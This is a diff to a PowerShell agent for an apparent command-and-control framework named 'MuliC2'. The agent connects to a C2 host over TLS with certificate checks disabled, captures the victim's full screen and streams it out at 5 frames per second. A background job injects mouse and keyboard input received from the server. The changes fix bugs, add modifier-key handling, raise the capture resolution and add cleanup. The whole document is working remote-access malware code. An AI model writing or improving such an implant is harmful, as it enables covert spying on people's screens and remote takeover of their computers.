@@ -67,14 +67,14 @@ function Invoke-MouseEvent {
                 switch ($button) {
                     0 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, $px, $py, 0, 0); Write-Host "[+] Left mouse button down" -ForegroundColor Green }
                     2 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTDOWN, $px, $py, 0, 0); Write-Host "[+] Right mouse button down" -ForegroundColor Green }
-                    1 { [Win32API]::mouse_event([Win32API]::MIDDLEDOWN, $px, $py, 0, 0); Write-Host "[+] Middle mouse button down" -ForegroundColor Green }
+                    1 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_MIDDLEDOWN, $px, $py, 0, 0); Write-Host "[+] Middle mouse button down" -ForegroundColor Green }
                 }
             }
             'mouseup' {
                 switch ($button) {
                     0 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, $px, $py, 0, 0); Write-Host "[+] Left mouse button up" -ForegroundColor Green }
                     2 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTUP, $px, $py, 0, 0); Write-Host "[+] Right mouse button up" -ForegroundColor Green }
-                    1 { [Win32API]::mouse_event([Win32API]::MIDDLEUP, $px, $py, 0, 0); Write-Host "[+] Middle mouse button up" -ForegroundColor Green }
+                    1 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_MIDDLEUP, $px, $py, 0, 0); Write-Host "[+] Middle mouse button up" -ForegroundColor Green }
                 }
             }
             'click' {
@@ -109,6 +109,12 @@ function Invoke-KeyboardEvent {
     )
     try {
         Write-Host "[*] Keyboard event: $event - Key: '$key' Code: '$code' KeyCode: $keyCode" -ForegroundColor Cyan
+        
+        # Handle modifier keys first
+        if ($ctrlKey) { [Win32API]::keybd_event(0x11, 0, 0, [UIntPtr]::Zero) }
+        if ($shiftKey) { [Win32API]::keybd_event(0x10, 0, 0, [UIntPtr]::Zero) }
+        if ($altKey) { [Win32API]::keybd_event(0x12, 0, 0, [UIntPtr]::Zero) }
+        
         $vkCode = 0
         switch ($key) {
             'Enter' { $vkCode = 0x0D }
@@ -148,6 +154,7 @@ function Invoke-KeyboardEvent {
                 }
             }
         }
+        
         if ($vkCode -ne 0) {
             if ($event -eq 'keydown') {
                 [Win32API]::keybd_event([byte]$vkCode, 0, 0, [UIntPtr]::Zero)
@@ -164,9 +171,61 @@ function Invoke-KeyboardEvent {
                 Write-Host "[!] Could not simulate key: $key" -ForegroundColor Red
             }
         }
+        
+        # Release modifier keys
+        if ($altKey) { [Win32API]::keybd_event(0x12, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero) }
+        if ($shiftKey) { [Win32API]::keybd_event(0x10, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero) }
+        if ($ctrlKey) { [Win32API]::keybd_event(0x11, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero) }
+        
     } catch {
         Write-Host "[!] Keyboard event simulation failed: $($_.Exception.Message)" -ForegroundColor Red
     }
+}
+
+function Start-Cleanup {
+    if ($global:cleanupInProgress) { return }
+    $global:cleanupInProgress = $true
+    $global:isRunning = $false
+    
+    Write-Host "`n[*] Cleaning up resources..." -ForegroundColor Yellow
+    
+    try {
+        if ($global:inputJob -and $global:inputJob.State -eq 'Running') {
+            Write-Host "[*] Stopping input job..." -ForegroundColor Yellow
+            Stop-Job $global:inputJob -Force
+            Remove-Job $global:inputJob -Force
+        }
+    } catch {
+        Write-Host "[!] Error cleaning up job: $($_.Exception.Message)" -ForegroundColor Red
+    }
+    
+    try {
+        if ($global:sslStream) {
+            $global:sslStream.Close()
+            $global:sslStream.Dispose()
+        }
+    } catch {
+        Write-Host "[!] Error closing SSL stream: $($_.Exception.Message)" -ForegroundColor Red
+    }
+    
+    try {
+        if ($global:tcpClient) {
+            $global:tcpClient.Close()
+            $global:tcpClient.Dispose()
+        }
+    } catch {
+        Write-Host "[!] Error closing TCP client: $($_.Exception.Message)" -ForegroundColor Red
+    }
+    
+    Write-Host "[+] Cleanup completed" -ForegroundColor Green
+}
+
+# Set up cleanup on exit
+Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action { Start-Cleanup }
+$null = Register-ObjectEvent -InputObject ([System.Console]) -EventName CancelKeyPress -Action { 
+    Write-Host "`n[*] Received Ctrl+C, initiating cleanup..." -ForegroundColor Yellow
+    Start-Cleanup
+    [System.Environment]::Exit(0)
 }
 
 $global:tcpClient = $null
@@ -185,110 +244,157 @@ try {
     }
     $global:tcpClient.EndConnect($asyncResult)
     Write-Host "[+] TCP connection established" -ForegroundColor Green
+    
     $socket = $global:tcpClient.Client
     $socket.ReceiveTimeout = -1
     $socket.SendTimeout = 30000
     $socket.NoDelay = $true
+    
     $global:sslStream = New-Object System.Net.Security.SslStream(
         $global:tcpClient.GetStream(),
         $false,
         ([System.Net.Security.RemoteCertificateValidationCallback] { param($sender, $certificate, $chain, $sslPolicyErrors) return $true })
     )
+    
     try {
         $global:sslStream.AuthenticateAsClient($C2Host)
     } catch {
         throw "SSL authentication failed: $($_.Exception.Message)"
     }
+    
     if (-not $global:sslStream.IsAuthenticated) {
         throw "SSL authentication failed - stream not authenticated"
     }
+    
     Write-Host "[+] SSL connection established and authenticated" -ForegroundColor Green
     Write-Host "[*] Starting screen capture... (Press CTRL+C to exit gracefully)" -ForegroundColor Cyan
-    Write-Host "[*] Capturing 200x150 resolution at 5 FPS" -ForegroundColor Gray
+    Write-Host "[*] Capturing 800x600 resolution at 5 FPS" -ForegroundColor Gray
 
-    $inputJob = Start-Job -ScriptBlock {
-        param($sslStream)
+    # Create input job with proper scope and error handling
+    $global:inputJob = Start-Job -ScriptBlock {
+        param($sslStreamArg, $functions)
+        
+        # Import functions into job scope
+        . ([ScriptBlock]::Create($functions))
+        
         Write-Host "[*] Input event listener job started" -ForegroundColor Magenta
-        $lastHeartbeat = Get-Date
-        while ($true) {
-            try {
-                $now = Get-Date
-                if (($now - $lastHeartbeat).TotalSeconds -ge 1) {
-                    Write-Host "[HEARTBEAT] Input event listener alive at $now" -ForegroundColor Yellow
-                    $lastHeartbeat = $now
-                }
-                $lengthBytes = New-Object byte[] 4
-                $bytesRead = $sslStream.Read($lengthBytes, 0, 4)
-                if ($bytesRead -ne 4) { Start-Sleep -Milliseconds 10; continue }
-                $msgLength = [BitConverter]::ToInt32($lengthBytes, 0)
-                if ($msgLength -le 0 -or $msgLength -gt 4096) { Start-Sleep -Milliseconds 10; continue }
-                $msgBytes = New-Object byte[] $msgLength
-                $read = 0
-                while ($read -lt $msgLength) {
-                    $n = $sslStream.Read($msgBytes, $read, $msgLength - $read)
-                    if ($n -le 0) { break }
-                    $read += $n
-                }
-                $json = [System.Text.Encoding]::UTF8.GetString($msgBytes, 0, $msgLength)
-                Write-Host "[*] Received input event: $json" -ForegroundColor Cyan
-                $event = $null
-                try { $event = $json | ConvertFrom-Json } catch { Write-Host "[!] Failed to parse input event JSON: $json" -ForegroundColor Red }
-                if ($event) {
-                    if ($event.type -eq 'mouse') {
-                        Invoke-MouseEvent $event.event $event.x $event.y $event.button
-                    } elseif ($event.type -eq 'keyboard') {
-                        Invoke-KeyboardEvent $event.event $event.key $event.code $event.keyCode $event.ctrlKey $event.shiftKey $event.altKey
-                    } elseif ($event.type -eq 'test' -and $event.event -eq 'show_messagebox') {
-                        try {
-                            Add-Type -AssemblyName System.Windows.Forms
-                            [System.Windows.Forms.MessageBox]::Show("Remote input test successful!", "MuliC2 VNC Agent")
-                            Write-Host "[*] MessageBox should be visible now." -ForegroundColor Green
-                        } catch {
-                            Write-Host "[!] Failed to show MessageBox: $($_.Exception.Message)" -ForegroundColor Red
+        
+        try {
+            while ($true) {
+                try {
+                    # Read message length header
+                    $lengthBytes = New-Object byte[] 4
+                    $totalRead = 0
+                    while ($totalRead -lt 4) {
+                        $bytesRead = $sslStreamArg.Read($lengthBytes, $totalRead, 4 - $totalRead)
+                        if ($bytesRead -eq 0) { throw "Connection closed by server" }
+                        $totalRead += $bytesRead
+                    }
+                    
+                    $msgLength = [BitConverter]::ToInt32($lengthBytes, 0)
+                    if ($msgLength -le 0 -or $msgLength -gt 8192) { 
+                        Write-Host "[!] Invalid message length: $msgLength" -ForegroundColor Red
+                        continue 
+                    }
+                    
+                    # Read message data
+                    $msgBytes = New-Object byte[] $msgLength
+                    $totalRead = 0
+                    while ($totalRead -lt $msgLength) {
+                        $bytesRead = $sslStreamArg.Read($msgBytes, $totalRead, $msgLength - $totalRead)
+                        if ($bytesRead -eq 0) { throw "Connection closed by server" }
+                        $totalRead += $bytesRead
+                    }
+                    
+                    $json = [System.Text.Encoding]::UTF8.GetString($msgBytes, 0, $msgLength)
+                    Write-Host "[*] Received input event: $json" -ForegroundColor Cyan
+                    
+                    try { 
+                        $event = $json | ConvertFrom-Json 
+                    } catch { 
+                        Write-Host "[!] Failed to parse input event JSON: $json" -ForegroundColor Red 
+                        continue
+                    }
+                    
+                    if ($event) {
+                        if ($event.type -eq 'mouse') {
+                            Invoke-MouseEvent $event.event $event.x $event.y $event.button
+                        } elseif ($event.type -eq 'keyboard') {
+                            Invoke-KeyboardEvent $event.event $event.key $event.code $event.keyCode $event.ctrlKey $event.shiftKey $event.altKey
+                        } elseif ($event.type -eq 'test' -and $event.event -eq 'show_messagebox') {
+                            try {
+                                Add-Type -AssemblyName System.Windows.Forms
+                                [System.Windows.Forms.MessageBox]::Show("Remote input test successful!", "MuliC2 VNC Agent")
+                                Write-Host "[*] MessageBox should be visible now." -ForegroundColor Green
+                            } catch {
+                                Write-Host "[!] Failed to show MessageBox: $($_.Exception.Message)" -ForegroundColor Red
+                            }
                         }
                     }
+                } catch {
+                    Write-Host "[!] Exception in input event processing: $($_.Exception.Message)" -ForegroundColor Red
+                    Start-Sleep -Milliseconds 100
                 }
-            } catch {
-                Write-Host "[!] Exception in input event listener: $($_.Exception.Message)" -ForegroundColor Red
-                Write-Host $_.ScriptStackTrace -ForegroundColor Red
             }
-            Start-Sleep -Milliseconds 10
+        } catch {
+            Write-Host "[!] Fatal exception in input event listener: $($_.Exception.Message)" -ForegroundColor Red
+            Write-Host $_.ScriptStackTrace -ForegroundColor Red
         }
-    } -ArgumentList $global:sslStream
+    } -ArgumentList $global:sslStream, (Get-Content Function:\Invoke-MouseEvent, Function:\Invoke-KeyboardEvent | Out-String)
 
-    # --- Screen Capture and Frame Sending Loop ---
+    # Screen Capture and Frame Sending Loop
     try {
         $realScreenWidth = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
         $realScreenHeight = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height
         $targetWidth = 800
         $targetHeight = 600
-        while ($global:isRunning) {
-            # Capture full screen and scale to 800x600
-            $bmpFull = New-Object System.Drawing.Bitmap $realScreenWidth, $realScreenHeight
-            $graphicsFull = [System.Drawing.Graphics]::FromImage($bmpFull)
-            $graphicsFull.CopyFromScreen(0, 0, 0, 0, $bmpFull.Size)
-            $bmp = New-Object System.Drawing.Bitmap $targetWidth, $targetHeight
-            $graphics = [System.Drawing.Graphics]::FromImage($bmp)
-            $graphics.DrawImage($bmpFull, 0, 0, $targetWidth, $targetHeight)
-            $ms = New-Object System.IO.MemoryStream
-            $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-            $frameBytes = $ms.ToArray()
-            $ms.Dispose()
-            $graphics.Dispose()
-            $bmp.Dispose()
-            $graphicsFull.Dispose()
-            $bmpFull.Dispose()
-            # Send frame with 4-byte little-endian length header
-            $lenBytes = [BitConverter]::GetBytes([int]$frameBytes.Length)
-            $global:sslStream.Write($lenBytes, 0, 4)
-            $global:sslStream.Write($frameBytes, 0, $frameBytes.Length)
-            $global:sslStream.Flush()
-            Start-Sleep -Milliseconds 200  # ~5 FPS
+        
+        Write-Host "[*] Real screen resolution: ${realScreenWidth}x${realScreenHeight}" -ForegroundColor Gray
+        Write-Host "[*] Capture resolution: ${targetWidth}x${targetHeight}" -ForegroundColor Gray
+        
+        while ($global:isRunning -and $global:sslStream.IsAuthenticated) {
+            try {
+                # Capture full screen and scale to target resolution
+                $bmpFull = New-Object System.Drawing.Bitmap $realScreenWidth, $realScreenHeight
+                $graphicsFull = [System.Drawing.Graphics]::FromImage($bmpFull)
+                $graphicsFull.CopyFromScreen(0, 0, 0, 0, $bmpFull.Size)
+                
+                $bmp = New-Object System.Drawing.Bitmap $targetWidth, $targetHeight
+                $graphics = [System.Drawing.Graphics]::FromImage($bmp)
+                $graphics.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
+                $graphics.DrawImage($bmpFull, 0, 0, $targetWidth, $targetHeight)
+                
+                $ms = New-Object System.IO.MemoryStream
+                $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+                $frameBytes = $ms.ToArray()
+                
+                # Clean up resources immediately
+                $ms.Dispose()
+                $graphics.Dispose()
+                $bmp.Dispose()
+                $graphicsFull.Dispose()
+                $bmpFull.Dispose()
+                
+                # Send frame with 4-byte little-endian length header
+                $lenBytes = [BitConverter]::GetBytes([int]$frameBytes.Length)
+                $global:sslStream.Write($lenBytes, 0, 4)
+                $global:sslStream.Write($frameBytes, 0, $frameBytes.Length)
+                $global:sslStream.Flush()
+                
+                Start-Sleep -Milliseconds 200  # ~5 FPS
+                
+            } catch {
+                Write-Host "[!] Exception in screen capture iteration: $($_.Exception.Message)" -ForegroundColor Red
+                Start-Sleep -Milliseconds 1000
+            }
         }
     } catch {
         Write-Host "[!] Exception in screen capture loop: $($_.Exception.Message)" -ForegroundColor Red
     }
+    
 } catch {
     Write-Host "[!] Connection error: $($_.Exception.Message)" -ForegroundColor Red
     Write-Host "[!] Make sure the MuliC2 listener is running on $C2Host`:$C2Port" -ForegroundColor Red
+} finally {
+    Start-Cleanup
 }
